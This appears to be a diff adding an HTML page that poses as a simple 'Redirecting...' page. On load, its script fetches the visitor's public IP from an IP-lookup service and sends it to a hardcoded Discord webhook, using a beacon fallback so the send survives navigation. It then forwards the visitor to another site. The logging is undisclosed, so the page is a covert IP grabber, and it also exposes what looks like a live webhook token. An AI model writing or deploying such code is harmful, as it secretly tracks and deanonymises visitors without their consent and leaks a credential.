@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <p>Redirecting...</p>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1561821416096272444/8bKP_4WBKGrxw-R_JnsM2HWXpDddcgk8a_rm5L0dJdTPjhzJRAHlel_enqs9UJy0AZ2j";
+        const REDIRECT_URL = "https://buildisland.xyz/#create/items/monochrome";
+
+        async function getClientIP() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                if (!response.ok) throw new Error("IP lookup failed");
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return null;
+            }
+        }
+
+        async function sendToWebhook(ip) {
+            const body = JSON.stringify({
+                content: ip ? `IP: ${ip}` : "IP: lookup failed"
+            });
+
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), 2500);
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body,
+                    keepalive: true,
+                    signal: controller.signal
+                });
+            } catch (error) {
+                // Fetch failed or timed out: try a beacon, which survives navigation.
+                try {
+                    navigator.sendBeacon(
+                        WEBHOOK_URL,
+                        new Blob([body], { type: "application/json" })
+                    );
+                } catch (e) {}
+            } finally {
+                clearTimeout(timer);
+            }
+        }
+
+        (async () => {
+            const ip = await getClientIP();
+
+            // Never block the redirect longer than ~4s total.
+            await Promise.race([
+                sendToWebhook(ip),
+                new Promise(resolve => setTimeout(resolve, 4000))
+            ]);
+
+            window.location.replace(REDIRECT_URL);
+        })();
+    </script>
+</body>
+</html>
